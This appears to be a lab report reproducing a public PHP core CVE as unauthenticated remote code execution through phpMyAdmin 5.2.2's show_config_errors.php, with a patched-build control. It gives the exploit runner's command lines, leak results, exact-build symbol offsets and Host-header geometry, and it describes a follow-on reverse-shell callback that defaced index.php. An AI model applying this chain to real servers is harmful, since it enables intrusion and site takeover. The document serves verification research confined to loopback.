# Public PHP core CVE through phpMyAdmin 5.2.2 — 2026-10-25

## Verdict

**PROVEN in the named loopback lab.** An unauthenticated client sends crafted
multipart requests to an unmodified PHP file shipped in phpMyAdmin 5.2.2,
maintains 149 unfinished blocker connections while Apache has 150 child
processes, and recovers ZendMM and libphp bases from an HTTP cookie. The forged
table targets `zif_system` and produces the fresh `id>x29` command marker as
`www-data`.

This is a reproduction of the public PHP core CVE-2026-109618 /
CVE-2026-109619 family, not a novel phpMyAdmin vulnerability and not a new
bounty submission.

## Scope and target identity

All traffic stayed on `127.0.0.1`. No public target was contacted.

- vulnerable URL: `http://127.0.0.1:18212/show_config_errors.php`
- app: functional phpMyAdmin 5.2.2 from the official all-languages archive,
  with mysqli, a normal minimal config, and MariaDB 11
- archive SHA-256: `8551c8bf3b166f232d5cf64bac877472e9d0cb8f2fe1858fab24f975e7d765b6`
- app route SHA-256: `a3106c711821bf84912686c2f94f55dc09eb31e2f53831b034b2f6336ab2ac1f`
- app state: mysqli loaded, MariaDB 11 healthy, `/index.php` served the normal
  phpMyAdmin login form
- runtime: PHP 8.4.26, Apache 2.4.69, `mod_php`, prefork
- libphp SHA-256: `51663cf883b1223436d4c99f31dd0225735ea5573665e4242621eee7f4ee679c`
- PHP defaults: `memory_limit=128M`, `post_max_size=8M`,
  `session.upload_progress.enabled=On`, `session.use_only_cookies=On`,
  `session.use_strict_mode=Off`
- Apache defaults: `StartServers=5`, `MinSpareServers=5`,
  `MaxSpareServers=10`, `MaxRequestWorkers=150`
- vulnerable app image:
  `sha256:7a707d31b3a197d8b3d7039eb7d28cd4625f8a3a72b33fc0dbe1a0a695c467e3`
- vulnerable PHP base:
  `php:8.4.26-apache@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a`
- MariaDB base used by both lanes:
  `mariadb:11@sha256:6422478cb8e159f080fb1d8ccf65101e26fe51385787fde7d16c3b165a331f15`

The decisive endpoint is shipped by phpMyAdmin. No artificial `health.php`,
test controller, plugin, or application code was present in this functional
target.

## Fresh vulnerable run

The marker did not exist before the run:

```text
PROOF_ABSENT
```

Command:

```powershell
python stock_phpmyadmin_gate.py `
  --url http://127.0.0.1:18212/show_config_errors.php `
  --host-header x `
  --blockers 149 `
  --settle 10 `
  --cmd 'id>x29' `
  --fetch /x29 `
  --expect 'uid=' `
  --leak-tries 3 `
  --fire-tries 6 `
  --timeout 180 `
  --ack-exact-profile
```

Decisive output:

```json
{
  "connected_blockers": 149,
  "blockers_alive_after_settle": 149,
  "blocker_failures_after_settle": 0,
  "heap": "0x7f675d600000",
  "libphp": "0x7f675f324000",
  "status": "rce_proved",
  "fire_attempt": 1,
  "blockers_alive_at_proof": 149,
  "blocker_failures_total": 0
}
```

The leak stage reported a 600,000-byte cookie containing 3,039 pointer hits.
During blocker setup the container had 150 Apache children. Together with the
149 still-live blocker connections and the successful producer/consumer chain,
this shows the stock pool was in use and the strategy worked in this run. The
runner does not map each socket to a distinct child PID.

Independent HTTP and filesystem readback both returned:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The file was owned by `www-data:www-data`, size 54, and was served at `/x29`
using the same `Host: x` geometry as the exploit requests.

## Fixed control

The matched control used the same build recipe, mysqli/MariaDB setup,
phpMyAdmin archive, endpoint bytes, PHP defaults, and 150-worker Apache
configuration, rebuilt with the PHP base tag changed to
`php:8.4.27-apache`.

- control URL: `http://127.0.0.1:18213/show_config_errors.php`
- PHP: 8.4.27
- fixed libphp SHA-256:
  `992b4b07fd4880b2dd5be75a4912e0dc619ca08e1a4ff0c7eac0dce4c1aa7c31`
- endpoint SHA-256:
  `a3106c711821bf84912686c2f94f55dc09eb31e2f53831b034b2f6336ab2ac1f`
- fixed app image:
  `sha256:d54e07f80e7e55c5140e83c01f9cb25f232991efccce7cc485a1824a8e68bdfd`
- fixed PHP base:
  `php:8.4.27-apache@sha256:c6527b06c772a2c3cae648ce58c23a2a12ed2fed41cdfb0619ea64be008cc601`

Fixed-control command:

```powershell
python stock_phpmyadmin_gate.py `
  --url http://127.0.0.1:18213/show_config_errors.php `
  --host-header x `
  --blockers 149 `
  --settle 10 `
  --cmd 'id>x30' `
  --fetch /x30 `
  --expect 'uid=' `
  --leak-tries 1 `
  --fire-tries 1 `
  --timeout 180 `
  --ack-exact-profile
```

With 149/149 blockers alive, the same leak request returned only a normal
32-byte `PHPSESSID`, zero decoded pointer clusters, and:

```json
{
  "heap": "0x0",
  "libphp": "0x0",
  "status": "leak_failed",
  "blockers_alive_after_leak": 149,
  "blocker_failures_after_leak": 0
}
```

The runner never entered the dispatch stage. `/var/www/html/x30` remained
absent and the endpoint still returned HTTP 200. This shows that this exact
calibrated leak/fire chain stops on the patched build; it is not a proof that
no unrelated exploit path could exist.

## Exact boundaries

- `Host: x` is an attacker-controlled allocation-geometry input accepted by
  this default vhost. A deployment that rejects or routes that Host differently
  needs a separately calibrated request.
- The proof requires same-worker affinity. This run maintained 149 valid
  unfinished chunked connections while Apache had 150 children; all 149
  connections remained live through proof. That is not a one-to-one
  socket-to-PID mapping, but the end-to-end result establishes that the
  strategy supplied the needed affinity in this run. The previous
  `worker_pin.py` estimate of 16 was not valid for stock Apache.
- phpMyAdmin `/index.php` was a negative route for this exact request profile.
  That result is geometry/profile-specific and does not establish that an
  application `session_start()` is required or generally protective. The
  proven route is the unauthenticated, shipped `/show_config_errors.php`.
- The heap layout, symbol offsets (`zif_system=0x465370`,
  `zval_ptr_dtor=0x65eb60`), and table landing (`0x690d8`) are exact-build
  values. They are not portable across PHP builds or extension/layout changes.
- A follow-on run also validated a real Bash callback on the first fire. The
  interactive shell returned `www-data`, `uid=33`, the live hostname, and
  `/var/www/html`; it then backed up and replaced `index.php`, and HTTP served
  the resulting `NADSEC / PWNED` page. See
  `PHPMYADMIN-LIVE-DEMO-RUNBOOK-20261025.md` and
  `evidence/phpmyadmin-live-shell-20261025.txt`.

## Files and provenance

- runner: `stock_phpmyadmin_gate.py`
- runner SHA-256:
  `8a513462f38ba3dd6e9eb95aa88f4ec4064b58d196e986e6a26b33972f448cec`
- pinned engine:
  `..\q618-stock-gate-20261024\thecybergeek-read-only\engine.py`
- pinned engine SHA-256:
  `007985fec968b2cea78a7b2d96aeb42dbe3b387dfcb88ab542614c4f9d2ffa5c`
- functional lab: `labs/phpmyadmin-functional-stock/`
  - `Dockerfile`: `c2e45dc6d24091743874f8e40422ddcc646d207ad6bf748e63e4825e1eb1b01f`
  - `docker-compose.yml`: `2f83aea7464f3c840eeb0f34fb87f676287a38018c6e6da60b61d6eadac8cc15`
  - `docker-compose.fixed.yml`: `52fad2780b4a0d72c7c6b658a8515bc26412b74f1be5629e963e7d12ff1e4217`
  - `config.inc.php`: `3d4e8f7cab8cc72907e0ada59fd3f921ad6a5fd5d19227d3e305cee35d284aaf`
- saved console/readback transcripts:
  `evidence/phpmyadmin-stock-20261025/`
- live-shell demo manifest:
  `evidence/phpmyadmin-live-demo-SHA256SUMS`

The saved text files preserve the console/readback text captured during the
live runs. The current containers independently retain the vulnerable marker
and fixed absence, identities, hashes, and app state; the pre-run absence and
blocker history are historical conditions and cannot be reconstructed after
the run.

Build/start commands (the compose files have distinct pinned project names):

```powershell
docker compose -f labs\phpmyadmin-functional-stock\docker-compose.yml up -d --build
docker compose -f labs\phpmyadmin-functional-stock\docker-compose.fixed.yml up -d --build
```

The Dockerfile verifies the phpMyAdmin archive SHA-256 before extraction. The
PHP and MariaDB image references are digest-pinned. The runner is deliberately
restricted to explicit `http://127.0.0.1:<port>` URLs and requires
`--ack-exact-profile` because its code offsets and heap geometry are not
portable.

Official PHP advisories:

- https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w
- https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp
- https://www.php.net/releases/8_4_27.php

The official advisory lists PHP 8.4.27 as patched. The local fixed control
independently matched that boundary.
